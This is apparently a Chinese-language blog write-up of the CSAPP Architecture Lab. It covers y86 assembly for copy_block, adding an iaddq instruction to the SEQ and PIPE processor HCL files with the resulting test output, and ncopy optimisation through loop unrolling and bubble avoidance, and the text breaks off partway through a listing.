y86-64 Assembly code written by fanesemyk, as Part A of CSAPP archlab</span><br><br>.pos <span class="hljs-number">0</span><br>irmovq stack, %rsp<br>call main<br>halt<br>.align <span class="hljs-number">8</span><br><span class="hljs-comment"># Source block</span><br>src:<br>.quad <span class="hljs-number">0x00a</span><br>.quad <span class="hljs-number">0x0b0</span><br>.quad <span class="hljs-number">0xc00</span><br><br><span class="hljs-comment"># Destination block</span><br>dest:<br>.quad <span class="hljs-number">0x111</span><br>.quad <span class="hljs-number">0x222</span><br>.quad <span class="hljs-number">0x333</span><br><br><span class="hljs-comment"># long copy_block(long* src, long* dest, long len)</span><br>copy_block:<br>pushq %r12      <span class="hljs-comment">#save r12, for it is callee-save</span><br>pushq %r13      <span class="hljs-comment">#save r13, for storing integer 1</span><br>pushq %r14<span class="hljs-comment">#save r14, for storing integer 8</span><br>irmovq $1, %r13<br>irmovq $8, %r14<br>irmovq $0, %rax <span class="hljs-comment">#result = 0</span><br>jmp loop_test   <span class="hljs-comment">#jump to the start point of loop</span><br>loop:<br>mrmovq <span class="hljs-number">0</span>(%rdi), %r12  <span class="hljs-comment">#use %r12 to save *rdi</span><br>addq %r14, %rdi       <span class="hljs-comment">#rdi++</span><br>rmmovq %r12, (%rsi)   <span class="hljs-comment">#*rsi = *(rdi - 1)</span><br>addq %r14, %rsi       <span class="hljs-comment">#rsi++</span><br>xorq %r12, %rax<br>subq %r13, %rdx<br>loop_test:<br>andq %rdx, %rdx<br>jg loop<br>popq %r14<br>popq %r13<br>popq %r12<br>ret<br><br>main:<br>irmovq src, %rdi<br>irmovq dest, %rsi<br>irmovq $3, %rdx<br>call copy_block<br>ret<br><br>.pos <span class="hljs-number">0x300</span><br>stack:<br></code></pre></td></tr></table></figure><p>32bit:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># This is a y86-32 Assembly code modified from the original 64-bit version</span><br><br>.pos <span class="hljs-number">0</span><br>irmovl stack, %esp<br>call main<br>halt<br>.align <span class="hljs-number">4</span><br><span class="hljs-comment"># Source block</span><br>src:<br>    .long <span class="hljs-number">0x00a</span><br>    .long <span class="hljs-number">0x0b0</span><br>    .long <span class="hljs-number">0xc00</span><br><br><span class="hljs-comment"># Destination block</span><br>dest:<br>    .long <span class="hljs-number">0x111</span><br>    .long <span class="hljs-number">0x222</span><br>    .long <span class="hljs-number">0x333</span><br><br><span class="hljs-comment"># long copy_block(long* src, long* dest, long len)</span><br>copy_block:<br>    pushl %ebp      <span class="hljs-comment"># Save %ebp, for it is callee-save</span><br>    pushl %ecx      <span class="hljs-comment"># Save %ecx, for storing integer 1</span><br>    pushl %edx      <span class="hljs-comment"># Save %edx, for storing integer 4</span><br>    irmovl $1, %ecx<br>    irmovl $4, %edx<br>    irmovl $0, %eax <span class="hljs-comment"># result = 0</span><br>    jmp loop_test   <span class="hljs-comment"># Jump to the start point of loop</span><br>loop:<br>    mrmovl <span class="hljs-number">0</span>(%edi), %ebp  <span class="hljs-comment"># Use %ebp to save *edi</span><br>    addl %edx, %edi       <span class="hljs-comment"># edi++</span><br>    rmmovl %ebp, (%esi)   <span class="hljs-comment"># *esi = *(edi - 1)</span><br>    addl %edx, %esi       <span class="hljs-comment"># esi++</span><br>    xorl %ebp, %eax<br>    subl %ecx, %ebx<br>loop_test:<br>    andl %ebx, %ebx<br>    jg loop<br>    popl %edx<br>    popl %ecx<br>    popl %ebp<br>    ret<br><br>main:<br>    irmovl src, %edi<br>    irmovl dest, %esi<br>    irmovl $3, %ebx<br>    call copy_block<br>    ret<br><br>.pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><p>详细解释这个程序：</p><ul><li>设置堆栈指针和跳转到 main 函数：</li></ul><p>irmovl stack, %esp: 设置堆栈指针 %esp 到 stack 标签的地址。<br>call main: 跳转到 main 函数。<br>halt: 如果程序结束或出现错误，将终止程序。</p><ul><li>定义源数组和目标数组：</li></ul><p>定义了两个数组，src 和 dest，其中包含了一些长整数数据。</p><ul><li>main 函数：</li></ul><p>irmovl src, %edi: 将 src 数组的地址加载到 %edi 寄存器，准备将其作为参数传递给 copy_block 函数。<br>irmovl dest, %esi: 同样地，将 dest 数组的地址加载到 %esi 寄存器，作为 copy_block 函数的参数。<br>irmovl $3, %ebx: 将值 3 加载到 %ebx 寄存器，作为 copy_block 函数的第三个参数 len。<br>call copy_block: 调用 copy_block 函数来执行数据复制和异或操作。<br>ret: 返回到主函数的调用点。</p><ul><li>copy_block 函数：</li></ul><p>pushl %ebp, pushl %ecx, pushl %edx: 将 %ebp、%ecx 和 %edx 寄存器的值压入堆栈，以便在函数结束时恢复这些寄存器的值。<br>irmovl $1, %ecx: 将 1 加载到 %ecx 寄存器，用作循环计数器的步长。<br>irmovl $4, %edx: 将 4 加载到 %edx 寄存器，用于计算数组索引的偏移。<br>irmovl $0, %eax: 初始化 %eax 寄存器为 0，用于存储异或和的结果。<br>jmp loop_test: 跳转到循环的开始点 loop_test。</p><ul><li>循环 loop：</li></ul><p>mrmovl 0(%edi), %ebp: 从 src 数组中读取一个长整数，并将其存储在 %ebp 寄存器中。<br>addl %edx, %edi: 增加 %edi 寄存器的值，即 src 数组的索引，以指向下一个元素。<br>rmmovl %ebp, (%esi): 将 %ebp 寄存器中的值写入 dest 数组的当前位置。<br>addl %edx, %esi: 增加 %esi 寄存器的值，即 dest 数组的索引，以指向下一个位置。<br>xorl %ebp, %eax: 计算异或和，将 %ebp 寄存器中的值与 %eax 寄存器中的值异或，并将结果存储在 %eax 中。<br>subl %ecx, %ebx: 减少循环计数器 %ebx 的值。</p><ul><li>循环控制 loop_test：</li></ul><p>cmpl $0, %ebx: 比较 %ebx 和 0，以检查是否应继续循环。<br>jg loop: 如果 %ebx 大于 0，则跳转到 loop 标签，继续执行循环。</p><ul><li>结束函数 copy_block：</li></ul><p>popl %edx, popl %ecx, popl %ebp: 恢复之前保存的 %edx、%ecx 和 %ebp 寄存器的值。<br>ret: 返回到调用 copy_block 函数的位置。</p><ul><li>这个程序的主要功能是从 src 复制数据到 dest，并计算复制的数据的异或和。它使用了循环来遍历数组，并将每个元素复制到目标数组中，同时计算异或和。程序的执行过程中，通过寄存器来保存和操作数据，最终返回异或和的值。</li></ul><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p><strong>任务：拓展SEQ处理器，即修改seq-full.hcl文件以支持iaddq。</strong></p><p>iaddq指令：将立即数与寄存器相加<br><img src="/images/arch-2.png"><br>按照顺序修改五个阶段，添加iaddq</p><h3 id="修改seq-full-hcl文件"><a href="#修改seq-full-hcl文件" class="headerlink" title="修改seq-full.hcl文件"></a>修改seq-full.hcl文件</h3><p><strong>取指阶段</strong></p><p>instr_valid：判断指令是否合法，当然应该加上。修改后为</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool instr_valid</span> = icode in <br>    &#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,<br>           IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;<br></code></pre></td></tr></table></figure><p>need_regids：判断指令是否包括寄存器指示符字节，当然也应该加上</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool need_regids</span> =<br>    icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, <br>             IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;<br><br></code></pre></td></tr></table></figure><p>need_valC：判断指令是否包括常数字，还是要加上</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool need_valC</span> =<br>    icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;<br></code></pre></td></tr></table></figure><p><strong>译码和写回阶段</strong></p><p>srcB：赋为产生valB的寄存器。译码阶段要从rA, rB 指明的寄存器读为 valA, valB，而iaddq有一个rB，于是有以下修改</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">word srcB = [<br>    icode <span class="hljs-keyword">in</span> &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : <span class="hljs-type">rB</span>;<br>    icode <span class="hljs-keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : <span class="hljs-type">RRSP</span>;<br>    <span class="hljs-number">1</span> : <span class="hljs-type">RNONE</span>;  # Don<span class="hljs-symbol">&#x27;t</span> need register<br>];<br></code></pre></td></tr></table></figure><p>dst_E：表明写端口 E 的目的寄存器，计算出来的值valE将放在那里。最终结果要存放在rB中，所以要修改</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada">word dstE = [<br>    icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ &#125; &amp;&amp; Cnd : <span class="hljs-type">rB</span>;<br>    icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IOPQ, IIADDQ &#125; : <span class="hljs-type">rB</span>;<br>    icode <span class="hljs-keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : <span class="hljs-type">RRSP</span>;<br>    <span class="hljs-number">1</span> : <span class="hljs-type">RNONE</span>;  # Don<span class="hljs-symbol">&#x27;t</span> write any register<br>];<br></code></pre></td></tr></table></figure><p><strong>执行阶段</strong></p><p>执行阶段ALU要对aluA和aluB进行计算，计算格式为：aluB OP aluA。所以aluaA可以是valA和valC或者+-8，aluaB只能是valB。而iaddq执行阶段进行的运算是valB + valC，于是可知修改</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-comment">## Select input A to ALU</span><br><span class="hljs-attribute">word aluA = [</span><br><span class="hljs-attribute">    icode in &#123; IRRMOVQ, IOPQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">valA;</span><br>    <span class="hljs-attribute">icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">valC;</span><br>    <span class="hljs-attribute">icode in &#123; ICALL, IPUSHQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">-8;</span><br>    <span class="hljs-attribute">icode in &#123; IRET, IPOPQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">8;</span><br>    <span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br><span class="hljs-attribute">];</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">## Select input B to ALU</span><br><span class="hljs-attribute">word aluB = [</span><br><span class="hljs-attribute">    icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="hljs-attribute">              IPUSHQ, IRET, IPOPQ, IIADDQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">valB;</span><br>    <span class="hljs-attribute">icode in &#123; IRRMOVQ, IIRMOVQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">0;</span><br>    <span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br>];<br></code></pre></td></tr></table></figure><p>set_cc：判断是否应该更新条件码寄存器，这里应该加上</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool set_cc</span> = icode in &#123; IOPQ, IIADDQ &#125;;<br></code></pre></td></tr></table></figure><p><strong>访存阶段</strong></p><p>iaddq没有访存阶段，无需修改</p><p><strong>更新PC阶段</strong></p><p>iaddq不涉及转移等操作，也无需修改</p><h3 id="测试SEQ"><a href="#测试SEQ" class="headerlink" title="测试SEQ"></a>测试SEQ</h3><ul><li>在&#x2F;sim&#x2F;seq目录下执行：</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">make VERSION=<span class="hljs-keyword">full</span><br></code></pre></td></tr></table></figure><p>报错，注释掉seq文件夹中Makefile有关GUI的代码。</p><p>重新执行。<br>还是报错，<br>注释掉&#x2F;sim&#x2F;pipe&#x2F;psim.c 806、807 line和&#x2F;sim&#x2F;seq&#x2F;ssim.c 844、845 line。即：有源代码中有matherr的一行和它的下一行<br>这样能编译成功了。</p><ul><li>运行一个简单的Y86-64 程序</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./ssim -t ../y86-code/asumi.yo<br></code></pre></td></tr></table></figure><p><img src="/images/arch-3.png"></p><ul><li>标准测试</li></ul><p>运行一个标准检查程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ../y86-code; make testssim<br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs gradle">fuzz@ubuntu:~<span class="hljs-regexp">/Architecture Lab/</span>archlab-handout<span class="hljs-regexp">/sim/</span>seq$ cd ../y86-code; make testssim<br>..<span class="hljs-regexp">/seq/</span>ssim -t asum.yo &gt; asum.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t asumr.yo &gt; asumr.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t cjr.yo &gt; cjr.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t j-cc.yo &gt; j-cc.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t poptest.yo &gt; poptest.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t pushquestion.yo &gt; pushquestion.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t pushtest.yo &gt; pushtest.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog1.yo &gt; prog1.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog2.yo &gt; prog2.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog3.yo &gt; prog3.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog4.yo &gt; prog4.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog5.yo &gt; prog5.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog6.yo &gt; prog6.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog7.yo &gt; prog7.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog8.yo &gt; prog8.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t ret-hazard.yo &gt; ret-hazard.seq<br><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;ISA Check&quot;</span> *.seq<br>asum.seq:ISA Check Succeeds<br>asumr.seq:ISA Check Succeeds<br>cjr.seq:ISA Check Succeeds<br>j-cc.seq:ISA Check Succeeds<br>poptest.seq:ISA Check Succeeds<br>prog1.seq:ISA Check Succeeds<br>prog2.seq:ISA Check Succeeds<br>prog3.seq:ISA Check Succeeds<br>prog4.seq:ISA Check Succeeds<br>prog5.seq:ISA Check Succeeds<br>prog6.seq:ISA Check Succeeds<br>prog7.seq:ISA Check Succeeds<br>prog8.seq:ISA Check Succeeds<br>pushquestion.seq:ISA Check Succeeds<br>pushtest.seq:ISA Check Succeeds<br>ret-hazard.seq:ISA Check Succeeds<br>rm asum.seq asumr.seq cjr.seq j-cc.seq poptest.seq pushquestion.seq pushtest.seq prog1.seq prog2.seq prog3.seq prog4.seq prog5.seq prog6.seq prog7.seq prog8.seq ret-hazard.seq<br><br></code></pre></td></tr></table></figure><ul><li>回归测试</li></ul><p>测试除iaddq的所有指令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ../ptest; make SIM=../seq/ssim<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">fuzz@ubuntu:~<span class="hljs-regexp">/Architecture Lab/</span>archlab-handout<span class="hljs-regexp">/sim/y</span>86-code$ cd ..<span class="hljs-regexp">/ptest; make SIM=../</span>seq/ssim<br>.<span class="hljs-regexp">/optest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">49</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/jtest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">64</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/ctest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">22</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/htest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">600</span> ISA Checks Succeed<br><br></code></pre></td></tr></table></figure><p>专门测试iaddq指令:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd <span class="hljs-built_in">..</span>/ptest; make <span class="hljs-attribute">SIM</span>=../seq/ssim <span class="hljs-attribute">TFLAGS</span>=-i<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">fuzz@ubuntu:~<span class="hljs-regexp">/Architecture Lab/</span>archlab-handout<span class="hljs-regexp">/sim/</span>ptest$ cd ..<span class="hljs-regexp">/ptest; make SIM=../</span>seq/ssim TFLAGS=-i<br>.<span class="hljs-regexp">/optest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">58</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/jtest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">96</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/ctest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">22</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/htest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">756</span> ISA Checks Succeed<br><br></code></pre></td></tr></table></figure><p>至此通过了实验材料中的所有测试用例。<br>以上是64bit，32bit所有修改的地方都一样，只不过指令变成了iaddl，则每个修改的地方变成了IIADDL。</p><h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><p><strong>任务：修改ncopy.ys and pipe-full.hcl两个文件，使得ncopy.ys跑得越快越好。目录：sim&#x2F;pipe</strong><br>PIPE 是使用了转发技术的流水线化的Y86-64处理器。它相比 Part B 增加了流水线寄存器和流水线控制逻辑。</p><p>在本部分中，我们要通过修改pipe-full.hcl和ncopy.ys来优化程序，通过程序的效率，也就是 CPE 来计算我们的分数</p><p>先修改pipe-full.hcl，增加iaddq指令，修改过程参考 Part B 即可。稳妥起见，修改后还是应该测试一下这个模拟器，Makefile参考 Part B 部分进行同样的修改后编译。然后执行以下命令进行测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./psim -t ../y86-code/asumi.yo<br><span class="hljs-built_in">cd</span> ../ptest; make SIM=../pipe/psim<br><span class="hljs-built_in">cd</span> ../ptest; make SIM=../pipe/psim TFLAGS=-i<br></code></pre></td></tr></table></figure><p>当所有测试都显示 Succeed 后开始正式优化</p><h3 id="使用iaddl"><a href="#使用iaddl" class="headerlink" title="使用iaddl"></a>使用iaddl</h3><p>len–&#x2F;src++&#x2F;dst++等操作，原代码对%ebx进行了不少次赋值操作，这些都可以用我们新增的iaddl指令替代。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># You can modify this portion</span><br><span class="hljs-comment"># Loop header</span><br>xorl %eax,%eax<span class="hljs-comment"># count = 0;</span><br>andl %edx,%edx<span class="hljs-comment"># len &lt;= 0?</span><br>jle Done<span class="hljs-comment"># if so, goto Done:</span><br><br>Loop:<br>mrmovl (%ebx), %esi<span class="hljs-comment"># read val from src...</span><br>rmmovl %esi, (%ecx)<span class="hljs-comment"># ...and store it to dst</span><br>andl %esi, %esi<span class="hljs-comment"># val &lt;= 0?</span><br>jle Npos<span class="hljs-comment"># if so, goto Npos:</span><br>iaddl $1, %eax<span class="hljs-comment"># count++</span><br>Npos:<br>iaddl $-<span class="hljs-number">1</span>, %edx<span class="hljs-comment"># len--</span><br>iaddl $4, %ebx<span class="hljs-comment"># src++</span><br>iaddl $4, %ecx<span class="hljs-comment"># dst++</span><br>andl %edx,%edx<span class="hljs-comment"># len &gt; 0?</span><br>jg Loop<span class="hljs-comment"># if so, goto Loop:</span><br></code></pre></td></tr></table></figure><p>评分标准：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">./correctness.<span class="hljs-keyword">pl</span>测试不同Block length下code <span class="hljs-keyword">range</span>是否符合<br><br>./benchmark.<span class="hljs-keyword">pl</span> 评分<br></code></pre></td></tr></table></figure><p>可以用.&#x2F;correctness.pl测试ncopy函数的正确性，然后使用.&#x2F;benchmark.pl来测试函数的性能，希望CPE<em>越小越好</em>。初始CPE为15.18，大于10.5为0分，小于7.5为满分60。</p><p>使用iaddl后：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Average</span> CPE<span class="hljs-number">13</span>.<span class="hljs-number">96</span><br><span class="hljs-attribute">Score</span><span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">60</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>CPE变小了，但依旧没有分数。</p><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p>循环展开通过增加每次迭代计算的元素的数量，减少循环的迭代次数来提升效率。<br>具体来说，通过循环展开：</p><ul><li>减少了索引计算的次数</li><li>减少了条件分支的判断次数</li></ul><h3 id="剩余数据处理"><a href="#剩余数据处理" class="headerlink" title="剩余数据处理"></a>剩余数据处理</h3><p>对于剩余数据，选择3路循环展开。</p><h3 id="消除气泡"><a href="#消除气泡" class="headerlink" title="消除气泡"></a>消除气泡</h3><p>注意，程序多次使用了下面的操作：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">mrmov<span class="hljs-string">q (%rdi)</span>, %r8<br>rmmovq %r8, (%rsi)<br></code></pre></td></tr></table></figure><p>Y86-64处理器的流水线有 F(取指)、D(译码)、E(执行)、M(访存)、W(写回) 五个阶段，D 阶段才读取寄存器，M 阶段才读取对应内存值，</p><p>即使使用转发来避免数据冒险，这其中也至少会有一个气泡。像这样</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">mrmov<span class="hljs-string">q (%rdi)</span>, %r8<br>bubble<br>rmmovq %r8, (%rsi)<br></code></pre></td></tr></table></figure><p>一个优化办法是，多取一个寄存器，连续进行两次数据复制。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">mrmov<span class="hljs-string">q (%rdi)</span>, %r8<br>mrmovq <span class="hljs-number">8</span>(%rdi), %r9<br>rmmovq %r8, (%rsi)<br>rmmovq %r9, <span class="hljs-number">8</span>(%rsi)<br></code></pre></td></tr></table></figure><p>像这样，对%r8和%r9进行读入和读出的操作之间都隔着一条其他指令，就不会有气泡产生了。</p><h3 id="最终优化"><a href="#最终优化" class="headerlink" title="最终优化"></a>最终优化</h3><p>最终优化的pipe-full.hcl:</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 